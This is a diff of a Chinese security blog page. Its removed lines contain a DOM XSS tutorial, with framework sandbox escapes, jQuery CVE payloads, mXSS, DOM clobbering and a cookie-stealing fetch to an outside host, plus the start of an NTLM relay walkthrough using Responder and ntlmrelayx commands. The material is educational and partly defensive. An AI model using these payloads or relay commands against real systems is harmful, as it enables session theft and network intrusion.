class="string">&#x27;data:text/javascript,&#x27;</span> + userInput);      <span class="comment">// 动态导入</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>引号逃逸示例：</strong> <code>eval(&#39;var name=&quot;&#39; + input + &#39;&quot;;&#39;)</code> → input: <code>&quot;+alert(1)+&quot;</code> → <code>var name=&quot;&quot;+alert(1)+&quot;&quot;;</code></p>
-<h2 id="四、DOM-Invader-工具"><a href="#四、DOM-Invader-工具" class="headerlink" title="四、DOM Invader 工具"></a>四、DOM Invader 工具</h2><p>DOM Invader是Burp Suite内置浏览器中的DOM型XSS检测工具。</p>
-<p><strong>工作原理：</strong> （1）Hook所有Source API，自动注入Canary金丝雀值；（2）监控数据流，Canary到达Sink时记录完整传播路径；（3）自动尝试将Canary替换为XSS Payload验证利用性。</p>
-<p><strong>使用步骤：</strong> Burp代理开启 → 内置浏览器打开目标 → DOM Invader面板Toggle On → 浏览目标触发操作 → Findings标签查看漏洞 → 点击<code>Exploit</code>验证。</p>
-<p><strong>核心配置：</strong></p>
-<table>
-<thead>
-<tr>
-<th>配置</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>Augmented DOM</code></td>
-<td>注入Canary到所有Source</td>
-</tr>
-<tr>
-<td><code>PostMessage</code></td>
-<td>拦截postMessage消息注入Canary</td>
-</tr>
-<tr>
-<td><code>Message Queue</code></td>
-<td>自动捕获到达的postMessage</td>
-</tr>
-</tbody></table>
-<p><strong>实战：</strong> 检测postMessage漏洞——自动发送含Canary的postMessage，到达innerHTML即发现；检测hash-based XSS——URL中加Canary作hash并追踪流向。</p>
-<h2 id="五、前端框架XSS场景"><a href="#五、前端框架XSS场景" class="headerlink" title="五、前端框架XSS场景"></a>五、前端框架XSS场景</h2><h3 id="5-1-AngularJS-1-x"><a href="#5-1-AngularJS-1-x" class="headerlink" title="5.1 AngularJS (1.x)"></a>5.1 AngularJS (1.x)</h3><p>AngularJS表达式引擎存在丰富的沙箱逃逸历史（多数在1.7+修复）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 沙箱逃逸（历史CVE）</span></span><br><span class="line">&#123;&#123; constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>) &#125;&#125;                    <span class="comment">// 1.0-1.1.5</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=<span class="string">&#x27;&#x27;</span>.<span class="property">valueOf</span>;                 <span class="comment">// 1.4.0-1.4.9</span></span><br><span class="line">  $eval(<span class="string">&quot;x=&#x27;\&quot;+(y).fromCharCode)\&quot;alert(1)\\\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>持续风险点：</strong> <code>$sce.trustAsHtml(userInput)</code>、<code>$compile(&#39;&lt;div&gt;&#39; + userInput + &#39;&lt;/div&gt;&#39;)($scope)</code>、<code>$templateCache.put(&#39;tpl&#39;, userInput)</code>。</p>
-<h3 id="5-2-Vue-js"><a href="#5-2-Vue-js" class="headerlink" title="5.2 Vue.js"></a>5.2 Vue.js</h3><p>Vue默认转义<code>&#123;&#123; &#125;&#125;</code>插值，但以下场景仍有XSS：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-html=&quot;userProvidedContent&quot;&gt;&lt;/div&gt;   &lt;!-- 最常见漏洞 --&gt;</span><br><span class="line">&lt;script&gt;new Vue(&#123; template: &#x27;&lt;div&gt;&#x27; + userInput + &#x27;&lt;/div&gt;&#x27; &#125;);&lt;/script&gt;</span><br><span class="line">&lt;a :href=&quot;userUrl&quot;&gt;链接&lt;/a&gt;  &lt;!-- javascript:alert(1) --&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>防护：</strong> <code>v-text</code>代替<code>v-html</code>；URL协议白名单<code>/^https?:/.test(url)</code>；DOMPurify过滤。</p>
-<h3 id="5-3-React"><a href="#5-3-React" class="headerlink" title="5.3 React"></a>5.3 React</h3><p>JSX默认转义，但以下API绕过：</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div dangerouslySetInnerHTML=&#123;&#123;<span class="attr">__html</span>: userInput&#125;&#125; /&gt;   <span class="comment">// 名称已警告</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#123;userUrl&#125;</span>&gt;</span>                                       // javascript:协议</span></span><br><span class="line"><span class="language-xml">const ref = useRef(null);</span></span><br><span class="line"><span class="language-xml">useEffect(() =&gt; &#123; ref.current.innerHTML = userInput; &#125;); // 绕过JSX转义</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="六、jQuery-不安全方法"><a href="#六、jQuery-不安全方法" class="headerlink" title="六、jQuery 不安全方法"></a>六、jQuery 不安全方法</h2><p>jQuery 3.0前，<code>html()</code>&#x2F;<code>append()</code>等方法通过正则提取<code>&lt;script&gt;</code>并用<code>$.globalEval()</code>执行：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jQuery &lt; 3.0 内部: 正则提取script标签后用 $.globalEval(script[1])</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>风险矩阵：</strong></p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>风险</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>.html()</code> <code>.append()</code> <code>.prepend()</code> <code>.after()</code> <code>.before()</code> <code>.replaceWith()</code></td>
-<td><strong>高</strong></td>
-<td>innerHTML + script eval（3.0前）</td>
-</tr>
-<tr>
-<td><code>.wrap()</code></td>
-<td>中</td>
-<td>DOM破坏</td>
-</tr>
-<tr>
-<td><code>.text()</code></td>
-<td>低</td>
-<td>textContent</td>
-</tr>
-<tr>
-<td><code>.attr()</code></td>
-<td>中</td>
-<td>设onclick等事件属性时危险</td>
-</tr>
-</tbody></table>
-<p><strong>经典漏洞：</strong></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选择器注入 (jQ &lt; 3.5.0): $(location.hash); → #&lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"><span class="comment">// html()过滤绕过 (CVE-2020-11022/23): .html(&quot;&lt;option&gt;&lt;style&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;&quot;)</span></span><br><span class="line"><span class="comment">// $.parseHTML不移除事件处理器: $.parseHTML(&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;) → append → XSS</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>jQuery 3.5.0：选择器以<code>&lt;</code>开头必须含<code>&gt;</code>才解析为HTML。</p>
-</blockquote>
-<h2 id="七、攻击流程图"><a href="#七、攻击流程图" class="headerlink" title="七、攻击流程图"></a>七、攻击流程图</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">                   ┌─────────────┐</span><br><span class="line">                   │  攻击者输入   │</span><br><span class="line">                   └──────┬──────┘</span><br><span class="line">                          │</span><br><span class="line">   ┌──────────────────────┼──────────────────────┐</span><br><span class="line">   ▼                      ▼                      ▼</span><br><span class="line">location.hash    document.referrer    window.name/postMessage</span><br><span class="line">   │                      │                      │</span><br><span class="line">   └──────────────────────┼──────────────────────┘</span><br><span class="line">                          │</span><br><span class="line">                          ▼</span><br><span class="line">               ┌─────────────────────┐</span><br><span class="line">               │  JavaScript 处理层   │</span><br><span class="line">               └──────────┬──────────┘</span><br><span class="line">                          │</span><br><span class="line">   ┌──────────────────────┼──────────────────────┐</span><br><span class="line">   ▼                      ▼                      ▼</span><br><span class="line">innerHTML/         document.write/       eval/Function/</span><br><span class="line">dangerously...     .html()/.append()     setTimeout(str)</span><br><span class="line">   │                      │                      │</span><br><span class="line">   └──────────────────────┼──────────────────────┘</span><br><span class="line">                          ▼</span><br><span class="line">                    ⚠ XSS触发 ⚠</span><br><span class="line">        Cookie窃取 / 钓鱼 / 键盘记录 / 内网探测</span><br></pre></td></tr></table></figure>
-
-<h2 id="八、常见陷阱与绕过"><a href="#八、常见陷阱与绕过" class="headerlink" title="八、常见陷阱与绕过"></a>八、常见陷阱与绕过</h2><h3 id="8-1-过滤缺陷"><a href="#8-1-过滤缺陷" class="headerlink" title="8.1 过滤缺陷"></a>8.1 过滤缺陷</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 黑名单绕过: &lt;scr&lt;script&gt;ipt&gt;过滤后→ &lt;script&gt;</span></span><br><span class="line"><span class="comment">// 事件处理器无需script: &lt;img src=x onerror=...&gt;</span></span><br><span class="line"><span class="comment">// 二次URL解码: %253C → decodeURI → %3C → 再解码 → &lt;</span></span><br><span class="line"><span class="comment">// 属性中HTML实体解码: escapeHtml(url) → href=&quot;javascript:alert(1)&quot; → 浏览器解码执行</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="8-2-DOM-Clobbering（DOM破坏）"><a href="#8-2-DOM-Clobbering（DOM破坏）" class="headerlink" title="8.2 DOM Clobbering（DOM破坏）"></a>8.2 DOM Clobbering（DOM破坏）</h3><p>利用HTML命名属性污染JS全局作用域：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https://evil.com/payload.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 代码中 config.url 不再是字符串，而是HTMLInputElement --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 双层嵌套: &lt;a id=&quot;cfg&quot; href=&quot;x&quot;&gt;&lt;a id=&quot;url&quot; href=&quot;y:&quot;&gt; → 复杂引用 --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="8-3-Mutation-XSS（mXSS）"><a href="#8-3-Mutation-XSS（mXSS）" class="headerlink" title="8.3 Mutation XSS（mXSS）"></a>8.3 Mutation XSS（mXSS）</h3><p>浏览器修复畸形HTML时可能使无害字符串被重新解析为可执行代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!-- <span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> --&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在特定解析模式下，注释结束符 --&gt;</span> 导致后续被解析执行 --&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<h3 id="8-4-Script-Gadgets"><a href="#8-4-Script-Gadgets" class="headerlink" title="8.4 Script Gadgets"></a>8.4 Script Gadgets</h3><p>利用框架将HTML字符串转变为可执行代码的路径（绕过CSP）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AngularJS指令: &#x27;&lt;div ng-click=&quot;constructor.constructor(\&#x27;alert(1)\&#x27;)()&quot;&gt;&#x27;</span></span><br><span class="line"><span class="comment">// lit-html: html`&lt;div&gt;$&#123;unsafeHTML(userInput)&#125;&lt;/div&gt;`  // unsafeHTML指令</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="九、完整攻击示例"><a href="#九、完整攻击示例" class="headerlink" title="九、完整攻击示例"></a>九、完整攻击示例</h2><h3 id="示例1：hash-→-innerHTML"><a href="#示例1：hash-→-innerHTML" class="headerlink" title="示例1：hash → innerHTML"></a>示例1：hash → innerHTML</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞页面: https://victim.com/search</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;r&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;结果: &#x27;</span> + <span class="built_in">decodeURIComponent</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">// Payload: https://victim.com/search#&lt;img src=x onerror=alert(document.cookie)&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="示例2：postMessage-→-eval"><a href="#示例2：postMessage-→-eval" class="headerlink" title="示例2：postMessage → eval"></a>示例2：postMessage → eval</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞页面: new Function(&#x27;return &#x27; + JSON.parse(e.data).expr)();</span></span><br><span class="line"><span class="comment">// 攻击: iframe.postMessage(&#x27;&#123;&quot;expr&quot;:&quot;(()=&gt;alert(1))()&quot;&#125;&#x27;, &#x27;*&#x27;)</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="示例3：React-dangerouslySetInnerHTML"><a href="#示例3：React-dangerouslySetInnerHTML" class="headerlink" title="示例3：React dangerouslySetInnerHTML"></a>示例3：React dangerouslySetInnerHTML</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Profile</span>(<span class="params">&#123; bio &#125;</span>) &#123; <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;__html:bio&#125;&#125;/</span>&gt;</span></span>; &#125;</span><br><span class="line"><span class="comment">// bio = &quot;&lt;img src=x onerror=\&quot;fetch(&#x27;//e.com?c=&#x27;+document.cookie)\&quot;&gt;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="示例4：Vue-v-html-API"><a href="#示例4：Vue-v-html-API" class="headerlink" title="示例4：Vue v-html + API"></a>示例4：Vue v-html + API</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-html=&quot;content&quot;&gt;&lt;/div&gt;   &lt;!-- API返回未过滤HTML → DOM XSS --&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="十、纵深防御"><a href="#十、纵深防御" class="headerlink" title="十、纵深防御"></a>十、纵深防御</h2><h3 id="CSP与Trusted-Types"><a href="#CSP与Trusted-Types" class="headerlink" title="CSP与Trusted Types"></a>CSP与Trusted Types</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&#123;rnd&#125;&#x27; &#x27;strict-dynamic&#x27;;</span><br><span class="line">  object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;; require-trusted-types-for &#x27;script&#x27;;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Trusted Types — 直接字符串赋值innerHTML会抛出TypeError</span></span><br><span class="line">el.<span class="property">innerHTML</span> = userInput;  <span class="comment">// ❌ TypeError!</span></span><br><span class="line"><span class="keyword">const</span> policy = trustedTypes.<span class="title function_">createPolicy</span>(<span class="string">&#x27;default&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">createHTML</span>: <span class="function"><span class="params">input</span> =&gt;</span> <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(input)</span><br><span class="line">&#125;);</span><br><span class="line">el.<span class="property">innerHTML</span> = policy.<span class="title function_">createHTML</span>(userInput);  <span class="comment">// ✓ 安全</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安全编码清单"><a href="#安全编码清单" class="headerlink" title="安全编码清单"></a>安全编码清单</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">✓ textContent / innerText     替代 innerHTML</span><br><span class="line">✓ DOMPurify.sanitize()        替代 直接HTML赋值</span><br><span class="line">✓ createElement + textContent 替代 document.write</span><br><span class="line">✓ encodeURIComponent()        替代 URL字符串拼接</span><br><span class="line">✓ e.origin 精确匹配            替代 indexOf/正则</span><br><span class="line">✓ 白名单验证                   替代 黑名单过滤</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DOM型XSS因其纯客户端执行特性，在安全检测链条中常被忽视。核心防御原则：</p>
-<ol>
-<li><strong>永不将不可信数据传入代码执行Sink</strong>（eval、Function、setTimeout字符串参数）</li>
-<li><strong>永不将不可信数据作为HTML插入DOM</strong>（innerHTML、document.write、v-html、dangerslySetInnerHTML）</li>
-<li><strong>URL上下文严格验证协议白名单</strong>（禁止<code>javascript:</code>和<code>data:</code>协议）</li>
-<li><strong>部署严格CSP与Trusted Types</strong></li>
-<li><strong>使用DOM Invader等自动化工具在开发生命周期各阶段检测DOM XSS</strong></li>
-</ol>
-<p>DOM XSS恶意载荷不经过服务端，服务端日志不会留下任何痕迹。攻击者尤其青睐此类攻击进行精准钓鱼和水坑攻击。</p>
-<p><em>本文所有技术细节仅用于安全研究和防护建设。任何利用文中技术进行的未授权测试或攻击行为，后果由行为人自行承担。</em></p>
-
+          <p>DOM 型 XSS 深入分析——Source/Sink 模型与常见危险 Sink 函数利用。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/XSS-dom-based/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -2150,7 +1161,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -2172,276 +1183,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>NTLM中继攻击（NTLM Relay Attack）是内网渗透中最经典、最有效的攻击手段之一。攻击者通过中间人技术截获目标主机的NTLM认证请求，并将其中继到其他未开启SMB签名的服务，从而实现横向移动和权限提升。本文从协议原理出发，系统演示Responder配合ntlmrelayx的完整攻击链，涵盖SMB&#x2F;HTTP&#x2F;LDAP&#x2F;MSSQL多协议中继及PrinterBug、PetitPotam等强制认证技术。</p>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
-<p><strong>本文仅供安全研究和授权测试使用。未经授权对他人系统实施本文所述技术属于违法行为，读者须自行承担所有法律责任。</strong></p>
-</blockquote>
-<h2 id="一、NTLM认证协议原理"><a href="#一、NTLM认证协议原理" class="headerlink" title="一、NTLM认证协议原理"></a>一、NTLM认证协议原理</h2><h3 id="1-1-认证流程"><a href="#1-1-认证流程" class="headerlink" title="1.1 认证流程"></a>1.1 认证流程</h3><p>NTLM采用挑战-响应机制，三次握手完成认证：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端(Client)                        服务端(Server)</span><br><span class="line">    |---(1) NEGOTIATE_MESSAGE -------------&gt;|  协商NTLM版本与能力</span><br><span class="line">    |&lt;--(2) CHALLENGE_MESSAGE --------------|  下发16字节随机Challenge</span><br><span class="line">    |---(3) AUTHENTICATE_MESSAGE ----------&gt;|  Net-NTLM Hash响应</span><br><span class="line">    |&lt;--(4) 认证结果 -----------------------|  成功/失败</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><strong>Negotiate</strong>：客户端声明支持的NTLM版本、会话签名能力等。</li>
-<li><strong>Challenge</strong>：服务端生成16字节随机Challenge发送给客户端。</li>
-<li><strong>Authenticate</strong>：客户端使用密码的NT Hash对Challenge做HMAC_MD5运算，生成Net-NTLM Hash作为响应。</li>
-<li><strong>验证</strong>：服务端将响应转发给域控或与本地SAM比对。</li>
-</ol>
-<h3 id="1-2-NTLMv1-vs-NTLMv2"><a href="#1-2-NTLMv1-vs-NTLMv2" class="headerlink" title="1.2 NTLMv1 vs NTLMv2"></a>1.2 NTLMv1 vs NTLMv2</h3><table>
-<thead>
-<tr>
-<th>特性</th>
-<th>NTLMv1</th>
-<th>NTLMv2</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>响应长度</td>
-<td>24字节</td>
-<td>可变（含时间戳）</td>
-</tr>
-<tr>
-<td>抗暴力破解</td>
-<td>弱</td>
-<td>强</td>
-</tr>
-<tr>
-<td>内嵌目标信息</td>
-<td>无</td>
-<td>含SPN</td>
-</tr>
-<tr>
-<td>Windows默认</td>
-<td>已禁用</td>
-<td>已启用</td>
-</tr>
-</tbody></table>
-<p>NTLMv2响应虽嵌入了目标服务名，但很多服务未严格校验，中继攻击仍然有效。<strong>核心认知：中继攻击转发的不是密码，而是整个认证消息，攻击者无需破解Hash。</strong></p>
-<h2 id="二、SMB签名——中继攻击的命门"><a href="#二、SMB签名——中继攻击的命门" class="headerlink" title="二、SMB签名——中继攻击的命门"></a>二、SMB签名——中继攻击的命门</h2><p>SMB签名通过在每条消息尾部附加会话密钥派生的数字签名来防篡改和防中继。目标服务器若强制签名则中继不可行。</p>
-<table>
-<thead>
-<tr>
-<th>发起方签名</th>
-<th>目标方签名</th>
-<th>可中继</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>不强制</td>
-<td>不强制</td>
-<td><strong>可中继</strong></td>
-</tr>
-<tr>
-<td>不强制</td>
-<td>强制</td>
-<td>不可中继</td>
-</tr>
-<tr>
-<td>强制</td>
-<td>强制</td>
-<td>不可中继</td>
-</tr>
-</tbody></table>
-<p><strong>探测工具：</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CrackMapExec 生成可中继列表</span></span><br><span class="line">crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket RunFinger</span></span><br><span class="line">python3 RunFinger.py -i 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># nmap</span></span><br><span class="line">nmap --script smb2-security-mode -p445 192.168.1.0/24</span><br></pre></td></tr></table></figure>
-
-<p>输出中 <code>signing:False</code> 即为可中继目标。</p>
-<h2 id="三、Responder：名称解析毒化"><a href="#三、Responder：名称解析毒化" class="headerlink" title="三、Responder：名称解析毒化"></a>三、Responder：名称解析毒化</h2><p>当内网主机名称解析失败时，会降级查询LLMNR（UDP 5355）、NBT-NS（UDP 137）、mDNS（UDP 5353）。Responder监听这些广播请求并伪造响应，诱骗受害者向攻击者发起NTLM认证。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 全协议毒化</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -rdwv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 纯毒化模式（关闭SMB/HTTP服务端，配合ntlmrelayx使用）</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># WPAD代理投毒</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -wFb</span><br></pre></td></tr></table></figure>
-
-<p><strong>关键配置</strong>（<code>/etc/responder/Responder.conf</code>）：将SMB和HTTP设为Off以释放端口给ntlmrelayx，保持LLMNR、NBT-NS、MDNS、WPAD为On。</p>
-<table>
-<thead>
-<tr>
-<th>协议</th>
-<th>端口</th>
-<th>触发条件</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>LLMNR</td>
-<td>UDP 5355</td>
-<td>DNS失败，Windows默认启用</td>
-</tr>
-<tr>
-<td>NBT-NS</td>
-<td>UDP 137</td>
-<td>NetBIOS名称查询</td>
-</tr>
-<tr>
-<td>mDNS</td>
-<td>UDP 5353</td>
-<td>macOS&#x2F;Linux</td>
-</tr>
-<tr>
-<td>WPAD</td>
-<td>自动发现</td>
-<td>浏览器代理自动配置</td>
-</tr>
-</tbody></table>
-<h2 id="四、ntlmrelayx：中继攻击核心引擎"><a href="#四、ntlmrelayx：中继攻击核心引擎" class="headerlink" title="四、ntlmrelayx：中继攻击核心引擎"></a>四、ntlmrelayx：中继攻击核心引擎</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip3 install impacket</span><br><span class="line"><span class="comment"># 或 git clone https://github.com/fortra/impacket &amp;&amp; cd impacket &amp;&amp; pip3 install .</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-1-中继到SMB"><a href="#4-1-中继到SMB" class="headerlink" title="4.1 中继到SMB"></a>4.1 中继到SMB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从文件读取目标列表</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -tf relay_targets.txt -smb2support</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定单目标 + 开启SOCKS代理留存会话</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -t 192.168.1.50 -smb2support -socks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -tf targets.txt -c <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-中继到HTTP"><a href="#4-2-中继到HTTP" class="headerlink" title="4.2 中继到HTTP"></a>4.2 中继到HTTP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-ntlmrelayx -t 192.168.1.50 -http-port 8080 -i</span><br><span class="line"><span class="comment"># 收到连接后 nc 127.0.0.1 11000 获取交互shell</span></span><br></pre></td></tr></table></figure>
-
